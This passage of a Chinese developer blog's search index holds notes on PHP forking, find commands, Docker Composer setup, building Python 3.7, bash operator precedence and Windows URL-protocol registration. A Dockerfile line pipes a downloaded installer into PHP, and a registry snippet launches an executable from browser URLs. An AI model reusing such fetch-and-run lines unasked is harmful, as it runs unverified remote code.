連線是可以共用的\n但不建議這樣做，同時在跑的程式結果有做 交易(translation) 就很麻煩\n所以還是分開來會比較好\n[pcntl_fork 導致 MySQL server has gone away 解決方案 - AllenChou - 博客園](https://www.cnblogs.com/AllenChou/p/6607182.html) {% asset_link web3.png 備份圖 %}\n\n**2019-12-04**\n建議做 fork 時候最好先把連線關掉\n完成重新做連線會比較好\n否則會預到很多問題\n\n## Daemon\n\n[PHP实现daemon | Nginlion](https://anyof.me/articles/489) {% asset_link web4.png 備份圖 %}\n[如何优雅地运行一个 Daemon](http://wsfdl.com/linux/2015/10/18/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E7%9A%84%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AAdaemon.html)\n[PHP多进程编程 | 第二世](https://sunzy.me/2017/09/php-multi-process/) {% asset_link web5.png 備份圖 %}\n\n### 彩蛋\n[shaneharter/PHP-Daemon: Build production-ready Daemons using PHP 5.3+. Build fault-tolerant applications without the boilerplate.](https://github.com/shaneharter/PHP-Daemon)\n[深入理解Linux修改hostname - 潇湘隐者 - 博客园](https://www.cnblogs.com/kerrycode/p/3595724.html)\n[Bash 程式設計教學：平行執行背景子行程，用 wait 等待工作結束 - G. T. Wang](https://blog.gtwang.org/programming/bash-tutorial-parallel-subprocesses-and-wait/)","tags":["php"],"categories":["PHP"]},{"title":"Shell 快速統計資料夾下底層檔案數量","url":"%2Fblog%2F2019%2F11%2F12%2FShell-%E5%BF%AB%E9%80%9F%E7%B5%B1%E8%A8%88%E8%B3%87%E6%96%99%E5%A4%BE%E4%B8%8B%E5%BA%95%E5%B1%A4%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F%2F","content":"\n\n```bash\nfor i in */ .*/ ; do      echo -n $i\": \" ;      (find \"$i/\" -maxdepth 1 -mindepth 1 -type d | wc -l) ;  done\n```\n\nmindepth 0 數字是指`.`本層開始搜尋的(包含.)自己，但通常會用 1(不包含 `.`)\nmaxdepth 1 數字是使`.`往後搜尋資料夾\n\n\n```bash\nfor i in */ .*/ ; do      echo -n $i\": \" ;      (find \"$i\" -maxdepth 3 -type f -name \"*.docx\" | wc -l) ;  done\n```\n\n[Recursively counting files in a Linux directory - Stack Overflow](https://stackoverflow.com/questions/9157138/recursively-counting-files-in-a-linux-directory)\n\n\n\n## find 確認資料夾是否有檔案\n\n```bash\n if [ `find . -mindepth 1  | wc -l ` -gt 0 ]; then echo \"test\"; fi\n```\n\n\n## awk 指令\n\necho 1 2 3 4 5 | awk {print 1}\n\n\n## 深入 find 指令\n\n發現 find 指令順序也有關係\n\n\n[find 实用程序](http://lifegoo.pluskid.org/wiki/UtilFind.html)\n[Linux Find 命令精通指南](https://www.oracle.com/technetwork/cn/topics/calish-find-096463-zhs.html)\n[find命令的几个例子解析(-a,-o,-path,-wholename,-prnue,-print) - 程序园](http://www.voidcn.com/article/p-bgvmodwd-pg.html)\n\n","tags":["shell"],"categories":["Linux"]},{"title":"Docker 執行專案的 PHP Composer 方法","url":"%2Fblog%2F2019%2F11%2F12%2FDocker-%E5%9F%B7%E8%A1%8C%E5%B0%88%E6%A1%88%E7%9A%84-PHP-Composer-%E6%96%B9%E6%B3%95%2F","content":"\n最近找了一下方法\n記錄一下\n\n\n<!--more-->\n\n這邊說明一下，最近把公司舊程式 Docker 化\n再一些程式初始化在想要怎麼用\n**一般不需要這樣做**，再有 CI /CD 情況下可以直接用 dockerfile 去做部屬，程式就不需要做掛載動作\n由於測試環境是放在 ftp 上面做 volume ，所以我沒有在 docker-compose 在架設初始化自己先做\n但網路資源很少，還是紀錄一下\n\n## docker-compose 方法 1\n\n```yml\nversion: '3'\nservices:\n  vvv:\n    build: ./xxx\n    volumes:\n    - ./ssss:/ooooo\n    command: php  xxxx\n    depends_on:\n      - composer\n  composer:\n    restart: 'no'\n    image: composer\n    command: install\n    volumes:\n      - ./ssss:/ooooo\n```\n\n## docker-compose 方法 2\n\n```yml\nversion: '3'\nservices:\n  vvv:\n    build: ./xxx\n    volumes:\n      - ./ssss:/ooooo\n    command: bash -c \"cd {composer_path} && composer install  && php  xxxxx\"\n```\n\n\n","tags":["docker"],"categories":["PHP"]},{"title":"在 Ubutnu 安裝 Python 3.7 筆記","url":"%2Fblog%2F2019%2F11%2F07%2FPython-3-7-%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98%2F","content":"\n最近在 Linux 安裝 Python 3.7 發現原生 `apt` 沒有包\n需要手動編譯安裝\n但遇到很多問題\n在這邊小記\n\n<!--more-->\n\n各種 Linux 遇到安裝會不太一樣\n網路的教學也不是都很能順利安裝\n由其是 ctype 還是不知道什麼原因會有問題\n但網路找的步驟用一用\n還不是很確定哪一個項目解除\n以下各種方法可以試試\n\n## 安裝 Python3.7\n\n首先，先檢查 openssl version \n不然跑 pip 時會出現\n\n```\n# Install requirements\nsudo apt-get install -y build-essential\nsudo apt-get install -y checkinstall\nsudo apt-get install -y libreadline-gplv2-dev\nsudo apt-get install -y libncursesw5-dev\nsudo apt-get install -y libssl-dev\nsudo apt-get install -y libsqlite3-dev\nsudo apt-get install -y tk-dev\nsudo apt-get install -y libgdbm-dev\nsudo apt-get install -y libc6-dev\nsudo apt-get install -y libbz2-dev\nsudo apt-get install -y zlib1g-dev\nsudo apt-get install -y openssl\nsudo apt-get install -y libffi-dev\nsudo apt-get install -y python3-dev\nsudo apt-get install -y python3-setuptools\nsudo apt-get install -y wget\nsudo apt-get install zlib1g-dev # \nsudo apt-get install libffi-dev # ctype 問題 參考如下\n# Prepare to build\nmkdir /tmp/Python37\ncd /tmp/Python37\n# Pull down Python 3.7, build, and install\nwget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz\ntar xvf Python-3.7.0.tar.xz\ncd /tmp/Python37/Python-3.7.0\n./configure --enable-optimizations\nsudo make altinstall\n\n# openssl 安裝(看情行使用，越新的Linux 應該不會做到這個)\nsudo apt-get install -y wget\nmkdir /tmp/openssl\ncd /tmp/openssl\nwget https://www.openssl.org/source/openssl-1.0.2q.tar.gz\ntar xvf openssl-1.0.2q.tar.gz\ncd /tmp/openssl/openssl-1.0.2q\n./config\nmake\nsudo make install\nsudo ln -sf /usr/local/ssl/bin/openssl `which openssl` \n\n## 這邊可以登出再登入 openssl version 有沒有換掉\n\nsudo pip3.7 install --upgrade pip\n\n```\n\n\n### pip tls 問題\n\n```\npip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.\nCollecting virtualenv\n  Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/virtualenv/\n  Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/virtualenv/\n  Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/virtualenv/\n  Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/virtualenv/\n  Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/virtualenv/\n  Could not fetch URL https://pypi.org/simple/virtualenv/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/virtualenv/ (Caused by SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")) - skipping\n  Could not find a version that satisfies the requirement virtualenv (from versions: )\nNo matching distribution found for virtualenv\npip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.\nCould not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")) - skipping\n```\n[python3.7安装后ssl问题-苏黎世1995的博客-51CTO博客](https://blog.51cto.com/13544424/2149473)\n\nPS:後來發現是我的 ubuntu 版本太舊\n\n選越大越不會遇到這個問題 ubuntu/xenial64 \n我一開始用 hashicorp/precise64  畢竟名次很前面\n[hashicorp - Vagrant Cloud](https://app.vagrantup.com/hashicorp)\n\n\n### openssl \n\n上面已經有放，不過我放一下我網路找到的文章\n但不太想整理，這邊可能有點亂\n\n[Installing OpenSSL locally under your username – DreamHost](https://help.dreamhost.com/hc/en-us/articles/360001435926-Installing-OpenSSL-locally-under-your-username)\n\n\n卡在 https://blog.csdn.net/github_38336924/article/details/82692075\n./python: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: Error 40\ngenerate-posix-vars failed\nmake: *** [pybuilddir.txt] Error 1\n＿\n~~未解~~\n請參考python3.7安裝步驟\n\n[SSL issues with Python 3.7 Install From Source](https://joshspicer.com/python37-ssl-issue)\n後來嘗試這篇\n\n[How to install openssl 1.0.2 with default openssl (1.1.1) on Ubuntu 16.04? - Ask Ubuntu](https://askubuntu.com/questions/1000629/how-to-install-openssl-1-0-2-with-default-openssl-1-1-1-on-ubuntu-16-04)\n\\# (This will create a sym link to the new binaries)  \nsudo ln -sf /usr/local/ssl/bin/openssl `which openssl` \n\n### ModuleNotFoundError: No module named ‘_ctypes’\n\n未解之謎，但用一用就正常\n\n```\nModuleNotFoundError: No module named ‘_ctypes’\n\nsudo apt-get update\nsudo apt-get upgrade\nsudo apt-get dist-upgrade\nsudo apt-get install build-essential python-dev python-setuptools python-pip python-smbus\nsudo apt-get install build-essential libncursesw5-dev libgdbm-dev libc6-dev\nsudo apt-get install zlib1g-dev libsqlite3-dev tk-dev\nsudo apt-get install libssl-dev openssl\nsudo apt-get install libffi-dev\n\n[安装python3.7时候，报错ModuleNotFoundError: No module named '_ctypes' - wang725的专栏 - CSDN博客](https://blog.csdn.net/wang725/article/details/79905612)\nor\n[python - Python3: ImportError: No module named '_ctypes' when using Value from module multiprocessing - Stack Overflow](https://stackoverflow.com/questions/27022373/python3-importerror-no-module-named-ctypes-when-using-value-from-module-mul)\n\nInstalling libffi-dev and re-installing python3.7 fixed the problem for me.\n\nto cleanly build py 3.7 libffi-dev is required or else later stuff will fail\n\n這邊感覺編譯失敗要重新清除編譯`sudo make clean`\n由於這一塊我不熟，或者刪掉 python 資料夾重新跑\n\nsudo apt-get install libffi-dev\n```\n\n## 安裝/更新 pip\n\n sudo pip3.7 install --upgrade pip\n\n[安装Python3.7过程中报错的解决方法 - 青衫博客 | QingShan Talk](https://qingshan.tk/2019/04/25/how-to-install-python3-on-old-os/)\n\nhttps://help.dreamhost.com/hc/en-us/articles/115000702772-Installing-a-custom-version-of-Python-3\nhttps://help.dreamhost.com/hc/en-us/articles/360001435926-Installing-OpenSSL-locally-under-your-username\n\n\n## 小記我要安裝的環境\n### 安裝 eyeD3\n\n```\ngit clone https://github.com/nicfit/eyeD3.git\ncd eyeD3\npython setup.py install\nsudo pip install pylast\n```\n\nor\n\n```\nsudo pip install eyeD3\n\nsudo pip install pylast\n```\n\n\neyeD3\n\n### 安裝 ffmpeg\n\nUbuntu 14版可以執行安裝!!\n\n\n> 在 Ubuntu 13 以後, FFmpeg 以經被 libav 取代.\n> 在官方提供的軟體庫沒有辨法再簡單的 sudo apt-get install ffmpeg 了.\n> 新的 libav-tools 套件也用 avconv 執行程式來取代原有的 ffmpeg. \n[在 Ubuntu 14.04 LTS 安裝 FFmpeg @ Welkin小窩 :: 痞客邦 ::](https://welkinchen.pixnet.net/blog/post/64803028-%E5%9C%A8-ubuntu-14.04-lts-%E5%AE%89%E8%A3%9D-ffmpeg)\n\nsudo add-apt-repository ppa:jonathonf/ffmpeg-4\nsudo apt-get update\nsudo apt-get install ffmpeg\n\n\n[How To Install FFmpeg on Ubuntu 18.04 & 16.04 LTS - TecAdmin](https://tecadmin.net/install-ffmpeg-on-linux/)\n[ffmpeg/avconv 轉檔與影片連接範例 - 石頭閒語](http://rocksaying.tw/archives/22568176.html)\n\n\n\n## docker 啟動 Python\n\n docker  run -it python:3.7 bash\n\n就這麼簡單\n\nAlpine 沒有安裝 bash\n所以不能做上面指令\n\n上面環境組裝 php + python 環境\n我又遇到 pip3 的問題\n但 php 源頭是用最新的 Linux\n所以我暫時用 apt 安裝\n退而求其次就降板\n\n**這邊跳過不要看，有更好的寫法，不用降板**\n留個紀錄\n```\nFROM php:7.3\n\n\n# ensure local python is preferred over distribution python\nENV PATH /usr/local/bin:$PATH\n\n# http://bugs.python.org/issue19846\n# > At the moment, setting \"LANG=C\" on a Linux system *fundamentally breaks Python 3*, and that's not OK.\nENV LANG C.UTF-8\n\n# extra dependencies (over what buildpack-deps already includes)\nRUN apt-get update && apt-get install -y --no-install-recommends \\\n        tk-dev \\\n        uuid-dev \\\n        wget \\\n        gnupg \\\n    && rm -rf /var/lib/apt/lists/*\n\nENV GPG_KEY 0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\nENV PYTHON_VERSION 3.7.5\n\nRUN set -ex \\\n    \\\n    && wget -O python.tar.xz \"https://www.python.org/ftp/python/${PYTHON_VERSION%%[a-z]*}/Python-$PYTHON_VERSION.tar.xz\" \\\n    && wget -O python.tar.xz.asc \"https://www.python.org/ftp/python/${PYTHON_VERSION%%[a-z]*}/Python-$PYTHON_VERSION.tar.xz.asc\" \\\n    && export GNUPGHOME=\"$(mktemp -d)\" \\\n    && gpg --batch --keyserver ha.pool.sks-keyservers.net --recv-keys \"$GPG_KEY\" \\\n    && gpg --batch --verify python.tar.xz.asc python.tar.xz \\\n    && { command -v gpgconf > /dev/null && gpgconf --kill all || :; } \\\n    && rm -rf \"$GNUPGHOME\" python.tar.xz.asc \\\n    && mkdir -p /usr/src/python \\\n    && tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \\\n    && rm python.tar.xz \\\n    \\\n    && cd /usr/src/python \\\n    && gnuArch=\"$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)\" \\\n    && ./configure \\\n        --build=\"$gnuArch\" \\\n        --enable-loadable-sqlite-extensions \\\n        --enable-optimizations \\\n        --enable-shared \\\n        --with-system-expat \\\n        --with-system-ffi \\\n        --without-ensurepip \\\n    && make -j \"$(nproc)\" \\\n# setting PROFILE_TASK makes \"--enable-optimizations\" reasonable: https://bugs.python.org/issue36044 / https://github.com/docker-library/python/issues/160#issuecomment-509426916\n        PROFILE_TASK='-m test.regrtest --pgo \\\n            test_array \\\n            test_base64 \\\n            test_binascii \\\n            test_binhex \\\n            test_binop \\\n            test_bytes \\\n            test_c_locale_coercion \\\n            test_class \\\n            test_cmath \\\n            test_codecs \\\n            test_compile \\\n            test_complex \\\n            test_csv \\\n            test_decimal \\\n            test_dict \\\n            test_float \\\n            test_fstring \\\n            test_hashlib \\\n            test_io \\\n            test_iter \\\n            test_json \\\n            test_long \\\n            test_math \\\n            test_memoryview \\\n            test_pickle \\\n            test_re \\\n            test_set \\\n            test_slice \\\n            test_struct \\\n            test_threading \\\n            test_time \\\n            test_traceback \\\n            test_unicode \\\n        ' \\\n    && make install \\\n    && ldconfig \\\n    \\\n    && find /usr/local -depth \\\n        \\( \\\n            \\( -type d -a \\( -name test -o -name tests \\) \\) \\\n            -o \\\n            \\( -type f -a \\( -name '*.pyc' -o -name '*.pyo' \\) \\) \\\n        \\) -exec rm -rf '{}' + \\\n    && rm -rf /usr/src/python \\\n    \\\n    && python3 --version\n\n# make some useful symlinks that are expected to exist\nRUN cd /usr/local/bin \\\n    && ln -s idle3 idle \\\n    && ln -s pydoc3 pydoc \\\n    && ln -s python3 python \\\n    && ln -s python3-config python-config\n\nRUN apt-get update && apt-get install -y --no-install-recommends \\\n        python3-pip \\\n        git \\\n        python3-setuptools\n\nRUN pip3 install eyeD3\n\nRUN pip3 install pylast==2.2.0\n\nRUN apt-get install -y --no-install-recommends \\\n    ffmpeg\n\nCMD [\"bash\"]\n```\n\n其實我有思考，是不是更正確是要把源頭 from image全改掉\n全部在包，不過我還沒這樣測試\n\n\n```\n\nFROM php:7.3\n\nRUN apt-get update -y && apt-get install -y openssl zip unzip git libmcrypt-dev\nRUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer\nRUN docker-php-ext-install opcache bcmath pdo_mysql mysqli\n\n\n# ensure local python is preferred over distribution python\nENV PATH /usr/local/bin:$PATH\n\n# http://bugs.python.org/issue19846\n# > At the moment, setting \"LANG=C\" on a Linux system *fundamentally breaks Python 3*, and that's not OK.\nENV LANG C.UTF-8\n\n# runtime dependencies\nRUN apt-get update && apt-get install -y --no-install-recommends \\\n\t\tca-certificates \\\n\t\tnetbase \\\n\t&& rm -rf /var/lib/apt/lists/*\n\nENV GPG_KEY 0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\nENV PYTHON_VERSION 3.7.5\n\nRUN set -ex \\\n\t\\\n\t&& savedAptMark=\"$(apt-mark showmanual)\" \\\n\t&& apt-get update && apt-get install -y --no-install-recommends \\\n\t\tdpkg-dev \\\n\t\tgcc \\\n\t\tlibbz2-dev \\\n\t\tlibc6-dev \\\n\t\tlibexpat1-dev \\\n\t\tlibffi-dev \\\n\t\tlibgdbm-dev \\\n\t\tliblzma-dev \\\n\t\tlibncursesw5-dev \\\n\t\tlibreadline-dev \\\n\t\tlibsqlite3-dev \\\n\t\tlibssl-dev \\\n\t\tmake \\\n\t\ttk-dev \\\n\t\tuuid-dev \\\n\t\twget \\\n\t\txz-utils \\\n\t\tzlib1g-dev \\\n# as of Stretch, \"gpg\" is no longer included by default\n\t\t$(command -v gpg > /dev/null || echo 'gnupg dirmngr') \\\n\t\\\n\t&& wget -O python.tar.xz \"https://www.python.org/ftp/python/${PYTHON_VERSION%%[a-z]*}/Python-$PYTHON_VERSION.tar.xz\" \\\n\t&& wget -O python.tar.xz.asc \"https://www.python.org/ftp/python/${PYTHON_VERSION%%[a-z]*}/Python-$PYTHON_VERSION.tar.xz.asc\" \\\n\t&& export GNUPGHOME=\"$(mktemp -d)\" \\\n\t&& gpg --batch --keyserver ha.pool.sks-keyservers.net --recv-keys \"$GPG_KEY\" \\\n\t&& gpg --batch --verify python.tar.xz.asc python.tar.xz \\\n\t&& { command -v gpgconf > /dev/null && gpgconf --kill all || :; } \\\n\t&& rm -rf \"$GNUPGHOME\" python.tar.xz.asc \\\n\t&& mkdir -p /usr/src/python \\\n\t&& tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \\\n\t&& rm python.tar.xz \\\n\t\\\n\t&& cd /usr/src/python \\\n\t&& gnuArch=\"$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)\" \\\n\t&& ./configure \\\n\t\t--build=\"$gnuArch\" \\\n\t\t--enable-loadable-sqlite-extensions \\\n\t\t--enable-optimizations \\\n\t\t--enable-shared \\\n\t\t--with-system-expat \\\n\t\t--with-system-ffi \\\n\t\t--without-ensurepip \\\n\t&& make -j \"$(nproc)\" \\\n# setting PROFILE_TASK makes \"--enable-optimizations\" reasonable: https://bugs.python.org/issue36044 / https://github.com/docker-library/python/issues/160#issuecomment-509426916\n\t\tPROFILE_TASK='-m test.regrtest --pgo \\\n\t\t\ttest_array \\\n\t\t\ttest_base64 \\\n\t\t\ttest_binascii \\\n\t\t\ttest_binhex \\\n\t\t\ttest_binop \\\n\t\t\ttest_bytes \\\n\t\t\ttest_c_locale_coercion \\\n\t\t\ttest_class \\\n\t\t\ttest_cmath \\\n\t\t\ttest_codecs \\\n\t\t\ttest_compile \\\n\t\t\ttest_complex \\\n\t\t\ttest_csv \\\n\t\t\ttest_decimal \\\n\t\t\ttest_dict \\\n\t\t\ttest_float \\\n\t\t\ttest_fstring \\\n\t\t\ttest_hashlib \\\n\t\t\ttest_io \\\n\t\t\ttest_iter \\\n\t\t\ttest_json \\\n\t\t\ttest_long \\\n\t\t\ttest_math \\\n\t\t\ttest_memoryview \\\n\t\t\ttest_pickle \\\n\t\t\ttest_re \\\n\t\t\ttest_set \\\n\t\t\ttest_slice \\\n\t\t\ttest_struct \\\n\t\t\ttest_threading \\\n\t\t\ttest_time \\\n\t\t\ttest_traceback \\\n\t\t\ttest_unicode \\\n\t\t' \\\n\t&& make install \\\n\t&& ldconfig \\\n\t\\\n\t&& apt-mark auto '.*' > /dev/null \\\n\t&& apt-mark manual $savedAptMark \\\n\t&& find /usr/local -type f -executable -not \\( -name '*tkinter*' \\) -exec ldd '{}' ';' \\\n\t\t| awk '/=>/ { print $(NF-1) }' \\\n\t\t| sort -u \\\n\t\t| xargs -r dpkg-query --search \\\n\t\t| cut -d: -f1 \\\n\t\t| sort -u \\\n\t\t| xargs -r apt-mark manual \\\n\t&& apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false \\\n\t&& rm -rf /var/lib/apt/lists/* \\\n\t\\\n\t&& find /usr/local -depth \\\n\t\t\\( \\\n\t\t\t\\( -type d -a \\( -name test -o -name tests \\) \\) \\\n\t\t\t-o \\\n\t\t\t\\( -type f -a \\( -name '*.pyc' -o -name '*.pyo' \\) \\) \\\n\t\t\\) -exec rm -rf '{}' + \\\n\t&& rm -rf /usr/src/python \\\n\t\\\n\t&& python3 --version\n\n# make some useful symlinks that are expected to exist\nRUN cd /usr/local/bin \\\n\t&& ln -s idle3 idle \\\n\t&& ln -s pydoc3 pydoc \\\n\t&& ln -s python3 python \\\n\t&& ln -s python3-config python-config\n\n# if this is called \"PIP_VERSION\", pip explodes with \"ValueError: invalid truth value '<VERSION>'\"\nENV PYTHON_PIP_VERSION 19.3.1\n# https://github.com/pypa/get-pip\nENV PYTHON_GET_PIP_URL https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py\nENV PYTHON_GET_PIP_SHA256 b86f36cc4345ae87bfd4f10ef6b2dbfa7a872fbff70608a1e43944d283fd0eee\n\nRUN set -ex; \\\n\t\\\n\tsavedAptMark=\"$(apt-mark showmanual)\"; \\\n\tapt-get update; \\\n\tapt-get install -y --no-install-recommends wget; \\\n\t\\\n\twget -O get-pip.py \"$PYTHON_GET_PIP_URL\"; \\\n\techo \"$PYTHON_GET_PIP_SHA256 *get-pip.py\" | sha256sum --check --strict -; \\\n\t\\\n\tapt-mark auto '.*' > /dev/null; \\\n\t[ -z \"$savedAptMark\" ] || apt-mark manual $savedAptMark; \\\n\tapt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false; \\\n\trm -rf /var/lib/apt/lists/*; \\\n\t\\\n\tpython get-pip.py \\\n\t\t--disable-pip-version-check \\\n\t\t--no-cache-dir \\\n\t\t\"pip==$PYTHON_PIP_VERSION\" \\\n\t; \\\n\tpip --version; \\\n\t\\\n\tfind /usr/local -depth \\\n\t\t\\( \\\n\t\t\t\\( -type d -a \\( -name test -o -name tests \\) \\) \\\n\t\t\t-o \\\n\t\t\t\\( -type f -a \\( -name '*.pyc' -o -name '*.pyo' \\) \\) \\\n\t\t\\) -exec rm -rf '{}' +; \\\n\trm -f get-pip.py\n\nRUN pip install eyeD3\n\n    \nCMD [\"bash\"]\n```\n\n\n### docker 修改經驗小記\n\n1. RUN 這個指令 假如是跟上面有關的，記得要用以下方法\n\n```\nRUN git clone https://xxxx \\\n    && cd xxx\n...\n```\n2. 安裝指令，記得要用`apt-get update && apt-get install -y --no-install-recommends \\`\n\n```\nRUN apt-get update && apt-get install -y --no-install-recommends \\\n\t\tca-certificates \\\n\t\tnetbase \\\n```\n\n3. 要合併 images ，建議找源頭一樣 image，這樣編譯 Dockerfile 比較無痛\n\n4.  Slim,Stretch,Alpine 那些到底是什麼?\n\n簡單說一下，Alpine 是體積更小的 Linux，所以她沒有 bash ，不能用 `docker run -it xxx bash` 真的不好用(我指的是 debug)\n看到還是滿多人推薦用 Debian\n\n**2020-01-09**\n在 docker 內建沒有 bash\n\n在 dockerfile 裝\n```\nRUN apk add --update bash && rm -rf /var/cache/apk/*\n```\n可以參考:Raspberry-Pi-使用-Docker-架設-flexget.md\n\n更多資訊:\n* [Benchmarking Debian vs Alpine as a Base Docker Image — Nick Janetakis](https://nickjanetakis.com/blog/benchmarking-debian-vs-alpine-as-a-base-docker-image)\n* [嗯嗯對，用 slim 或是 alpine 確實可以省下很多空間，但同時他們也少裝了很多東西，可能會導致一些問題](https://medium.com/@larry850806/%E5%97%AF%E5%97%AF%E5%B0%8D-%E7%94%A8-slim-%E6%88%96%E6%98%AF-alpine-%E7%A2%BA%E5%AF%A6%E5%8F%AF%E4%BB%A5%E7%9C%81%E4%B8%8B%E5%BE%88%E5%A4%9A%E7%A9%BA%E9%96%93-%E4%BD%86%E5%90%8C%E6%99%82%E4%BB%96%E5%80%91%E4%B9%9F%E5%B0%91%E8%A3%9D%E4%BA%86%E5%BE%88%E5%A4%9A%E6%9D%B1%E8%A5%BF-%E5%8F%AF%E8%83%BD%E6%9C%83%E5%B0%8E%E8%87%B4%E4%B8%80%E4%BA%9B%E5%95%8F%E9%A1%8C-93c4cfa7b024)\n* [如何挑选node docker镜像 - Ryan.Miao - 博客园](https://www.cnblogs.com/woshimrf/p/node-docker-image.html)\n* [「译」如何选择python项目的基础docker镜像 - Wiki - DeanWu's Wiki Blog](https://pylixm.cc/posts/2019-06-26-base-image-python-docker-images.html)\n\n5. Dockerfile 有多個可以獨立放在資料夾裡面，感覺在整合 docker-compose 會比較方便","tags":["python"],"categories":["Linux"]},{"title":"shell script 布林運算順序","url":"%2Fblog%2F2019%2F11%2F06%2Fshell-script-%E5%B8%83%E6%9E%97%E9%81%8B%E7%AE%97%E9%A0%86%E5%BA%8F%2F","content":"\n一般寫程式都有 not and or 順序去做運算\n但今天我發現 shell script 運算結果跟(別的)程式結果不太一樣\n查了一下發現，shell script 是由`左往右`\n\n<!--more-->\n\n這邊就很清楚，說shell 布林運算都是**左到右**\n\n> In many computer languages, operators with the same precedence are left-associative. That is, in the absence of grouping structures, leftmost operations are executed first. Bash is no exception to this rule.\n> This is important because, in Bash, && and || have the same precedence.\n> So what happens in your example is that the leftmost operation (||) is carried out first:\n> ...\n[bash - Precedence of the shell logical operators &&, || - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/88850/precedence-of-the-shell-logical-operators)\n\n\n## if 多條件 boolean 寫法\n\n可用 && , ||\n\n```sh\nif [ -e $xxxx ] || [ -e $oooo ] && [ -e $dddd ] && [  -e $eeee ]\nthen\n    ....\nelse\n    ....\nfi\n```\n\n可用 bash `[[` 和 `]]`調整順序\n```bash\nif [ -e $dddd ] && [  -e $eeee ] && [[ -e $xxxx  ||  -e $oooo ]] \nthen\n    ....\nelse\n    ....\nfi\n```\n\n發現 sh 也可以用 `(` `)`\n```sh\nif [ -e $dddd ] && [  -e $eeee ] && ([ -e $xxxx ] || [ -e $oooo ]) \nthen\n    ....\nelse\n    ....\nfi\n\n```\n\n還可以這樣用`-o` `-a`\n\n```sh\nif [ -e $dddd ] && [  -e $eeee ] && [ -e $xxxx -o -e $oooo ]\nthen\n    ....\nelse\n    ....\nfi\n\n```\n\n參考連結:\n\n[Bash if statement with multiple conditions throws an error - Stack Overflow](https://stackoverflow.com/questions/16203088/bash-if-statement-with-multiple-conditions-throws-an-error)\n[Multiple conditions in if statement shell script - Stack Overflow](https://stackoverflow.com/questions/23542574/multiple-conditions-in-if-statement-shell-script)\n[shell - Boolean operators ( &&, -a, ||, -o ) in Bash - Stack Overflow](https://stackoverflow.com/questions/20449680/boolean-operators-a-o-in-bash)\n[bash - How to represent multiple conditions in a shell if statement? - Stack Overflow](https://stackoverflow.com/questions/3826425/how-to-represent-multiple-conditions-in-a-shell-if-statement)\n\n## 彩蛋\n\n[Vagrant介绍-从使用到放弃再到掌握完全指南 - 宋净超的博客|Cloud Native|云原生布道师](https://jimmysong.io/posts/vagrant-intro/)\n[bash - How do you break an array in groups of n - Stack Overflow](https://stackoverflow.com/questions/23747612/how-do-you-break-an-array-in-groups-of-n)\n\n比較檔案是否一致\n[Fastest way to tell if two files are the same in Unix/Linux? - Stack Overflow](https://stackoverflow.com/questions/12900538/fastest-way-to-tell-if-two-files-are-the-same-in-unix-linux)","tags":["shell"],"categories":["Linux"]},{"title":"Windows 註冊瀏覽器協定方法","url":"%2Fblog%2F2019%2F11%2F06%2F%E8%A8%BB%E5%86%8A%E7%80%8F%E8%A6%BD%E5%99%A8%E5%8D%94%E5%AE%9A%E6%96%B9%E6%B3%95%2F","content":"\n最近要使用瀏覽器套件 暴力猴 操作一些程式\n一直再想有什麼可以執行 bash 方法\n最後有找到一篇 window 註冊協定\n\n<!--more-->\n\n找到這篇[Register protocol - MozillaZine Knowledge Base](http://kb.mozillazine.org/Register_protocol)\n簡單設定登錄檔就能解決\n\n```\nREGEDIT4\n\n[HKEY_CLASSES_ROOT\\foo]\n@=\"URL:foo Protocol\"\n\"URL Protocol\"=\"\"\n\n[HKEY_CLASSES_ROOT\\foo\\shell]\n\n[HKEY_CLASSES_ROOT\\foo\\shell\\open]\n\n[HKEY_CLASSES_ROOT\\foo\\shell\\open\\command]\n@=\"\\\"C:\\\\Program Files\\\\Application\\\\program.exe\\\" \\\"%1\\\"\" \n```\n\n就這麼簡單，這邊的 %1 是 url 代的網址，後面都會加`/`( 我是用 Firefox，Chrome不確定 )\n\n## 番外小記\n\n跟本篇沒有關係\n其實我呼就出我的 sh\n做開啟反向代理\n但還是失敗了...\n\n```sh\ncd /d/\n# pwd\n# ./caddy2.exe stop\n# ./caddy2.exe start --config caddyfile.json\n\n# curl -X PATCH \\\n#   http://localhost:2019/config/apps/http/servers/proxy/routes/0/handle/0/headers/request/set/Cookie/0 \\\n#   -H 'Content-Type: application/json' \\\n#   -H 'cache-control: no-cache' \\\n#   -d 